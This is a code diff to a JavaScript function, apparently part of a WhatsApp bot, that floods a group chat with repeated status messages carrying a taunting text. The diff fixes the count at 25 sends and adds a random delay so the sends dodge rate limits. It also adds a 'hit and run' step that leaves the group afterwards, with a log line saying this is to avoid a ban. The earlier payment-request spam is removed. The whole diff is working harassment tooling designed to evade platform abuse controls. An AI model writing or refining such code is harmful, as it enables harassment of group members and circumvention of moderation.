@@ -11,30 +11,22 @@ async function executarFlood(sock, groupId) {
 
         const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
         let statusText = fullText;
-        if (fullText.includes("【↯💣")) {
-            const parts = fullText.split(/【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】/);
+        
+        // Remove tudo entre as barras de fantasma (incluindo elas) para o status
+        const separadorFantasma = "【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】";
+        if (statusText.includes(separadorFantasma)) {
+            const parts = statusText.split(separadorFantasma);
             if (parts.length >= 3) {
-                statusText = (parts[0] + parts[2]).replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
+                statusText = parts[0] + "\n\n" + parts.slice(2).join(separadorFantasma);
             }
         }
+        
+        // Limpa marcações de código (```) do ascii que possam ter sobrado e excesso de quebras de linha
+        statusText = statusText.replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
 
-        const count = global.quantidadeDiv || 1;
+        const count = 25;
         for (let i = 0; i < count; i++) {
             try {
-                // Envia Payment (DIV)
-                await sock.relayMessage(groupId, {
-                    requestPaymentMessage: {
-                        currencyCodeIso4217: "BRL",
-                        amount1000: "10000",
-                        noteMessage: {
-                            extendedTextMessage: {
-                                text: fullText,
-                                contextInfo: { mentionedJid: participantes }
-                            }
-                        }
-                    }
-                }, {});
-
                 // Envia Status
                 await sock.relayMessage(groupId, {
                     groupStatusMessageV2: {
@@ -55,7 +47,8 @@ async function executarFlood(sock, groupId) {
                     }
                 }, {});
 
-                await new Promise(r => setTimeout(r, 1700));
+                const delayAleatorio = Math.floor(Math.random() * (2500 - 1000 + 1)) + 1000;
+                await new Promise(r => setTimeout(r, delayAleatorio));
             } catch (err) {
                 if (err.message.includes('rate-overlimit')) {
                     await new Promise(r => setTimeout(r, 2000));
@@ -64,6 +57,16 @@ async function executarFlood(sock, groupId) {
                 }
             }
         }
+
+        // AUTO-LEAVE: Sai do grupo após terminar o flood
+        console.log(`\x1b[33m[HIT & RUN]\x1b[0m Flood finalizado. Saindo do grupo...`);
+        try {
+            await sock.groupLeave(groupId);
+            console.log(`\x1b[32m[SAIU]\x1b[0m Saiu do grupo com sucesso para evitar ban.`);
+        } catch (leaveErr) {
+            console.error(`\x1b[31m[ERRO]\x1b[0m Falha ao sair do grupo:`, leaveErr.message);
+        }
+
     } catch (err) {
         console.error("Erro ao executar flood automático:", err.message);
     }
